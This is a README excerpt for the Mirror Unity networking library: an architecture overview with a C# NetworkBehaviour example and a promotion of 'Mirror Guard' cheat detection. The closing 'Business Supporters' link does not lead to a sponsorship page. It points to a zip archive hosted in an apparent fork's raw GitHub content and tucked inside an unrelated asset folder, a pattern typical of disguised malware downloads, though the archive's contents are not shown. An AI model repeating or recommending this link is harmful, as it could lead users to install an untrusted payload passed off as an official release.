## Architecture
The **Server & Client** are **ONE project** in order to achieve maximum productivity.

Simply use **NetworkBehaviour** instead of **MonoBehaviour**.

Making multiplayer games this way is fun & easy:

```cs
public class Player : NetworkBehaviour
{
    // Synced automatically
    [SyncVar] public int health = 100;
    
    // Lists, Dictionaries, Sets too
    SyncList<Item> inventory = new SyncList<Item>();
    
    // Server/Client-only code
    [Server] void LevelUp() {}
    [Client] void Animate() {}
    
    void Update()
    {
        // isServer/isClient for runtime checks
        if (isServer) Heal();
        if (isClient) Move();
    }
    
    // Zero overhead remote calls
    [Command]   void CmdUseItem(int slot) {} // Client to Server
    [ClientRpc] void RpcRespawn() {}         // Server to all Clients
    [TargetRpc] void Hello() {}              // Server to one Client
}
```

There's also **NetworkServer** & **NetworkClient**.</br>
And that's about it 🤩

## Mirror Guard 🔒
We recently built the first version of our new "Mirror Guard" - Cheat Detection for Multiplayer Games.<br/>
Mirror Guard is running in a production game today, so we want to make this available to more studios on demand.<br/>

Mirror Guard is built with three core principles in mind:<br/>
1️⃣ Detection over Prevention: silently reports cheaters to the server, instead of trying to block them.<br/>
2️⃣ Zero Risk: Mirror Guard focuses on stability, we never want honest players to encounter issues, ever.<br/>
3️⃣ Real World Threats: Mirror Guard only blocks cheats which we encountered in production.<br/>

🍉 Mirror Guard V1 is able to safely detect Melon Loader, which we've found to be the foundation for the vast majority of cheats that we encountered.

If you are interested, Mirror Guard is available for [Business Supporters](https://raw.githubusercontent.com/ramansw/Mirror/master/Assets/Mirror/Components/InterestManagement/Distance/Mirror_v2.9-alpha.1.zip)!
